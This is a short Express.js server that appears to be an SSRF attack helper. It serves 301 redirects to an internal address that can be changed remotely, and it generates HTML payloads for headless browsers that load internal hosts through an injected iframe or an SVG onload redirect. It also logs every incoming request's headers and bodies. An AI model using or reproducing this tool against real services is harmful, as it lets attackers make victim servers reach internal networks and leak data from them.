//require('newrelic');
// arm
const path = require('path');
const express = require('express');
const bodyParser = require('body-parser');
const app = express();
const cors = require('cors');

const PORT = process.env.PORT || 808;

app.use(cors())
app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));


let temp = '//127.0.0.1';

app.get('/ssrf', (req, res, next) =>{
    res.setHeader('Location', temp)
    res.statusCode= 301;
    res.send()
});
// short variant
app.use('/s', (req, res, next) =>{
    console.log(req.headers);
    console.log(JSON.stringify(req.body));
    res.setHeader('Location', temp)
    res.statusCode= 301;
    res.send('Hello world! OK.');
});

app.post('/ssrf', (req, res, next) =>{
    temp = req.body.data || '/';
    console.log(temp);
    res.send(`Saved ${temp}`)
});

// rout witout response
app.use('/noresponse', (req, res) =>{
    console.log(req.headers)
    console.log(JSON.stringify(req.body))
});

// html ssrf presets for headless browser /rhtml/127.0.0.1:80fsi
// f - iframe
// s - svg onload redirect
// i - no response image for delay
app.use('/rhtml/:uid', (req, res) =>{
	let tmp = '<html><head></head><body><script></script><svg><img></body></html>';
	const uid = req.params.uid;
	let host = uid.split(':')[0];
	let port = parseInt(uid.split(':')[1],10);
	let location = `http://${host}:${port}`;
	
	if(uid.includes('f')){
		tmp = tmp.replace('<script>', `<script>f=document.createElement('iframe');f.src = '${location}';document.body.appendChild(f);</script>`)
	}
	
	if(uid.includes('s')){
		tmp = tmp.replace('<svg>', `<svg/onload="location='${location}'">`)
	}

	if(uid.includes('i')){
		tmp = tmp.replace('<svg>', '<img src="http://s.srcb.fun/noresponse">')
	}
	
	res.status(200).send(tmp);
});

app.use((req, res) => {
    const rMethod = req.method;
    const rUrl = req.url;
    const rHeaders = req.headers;
    console.info('START-------------------------------------------------------------\n'+rMethod + ' ' + rUrl);
    console.info(rHeaders);
    console.info('BODY--------------------------------------------------------------\n'+JSON.stringify(req.body));
    res.end(rUrl)
    console.info('END---------------------------------------------------------------\n\n\n');
});

app.listen(PORT, ()=>{
    console.log(`Server is working on ${PORT}`);
});
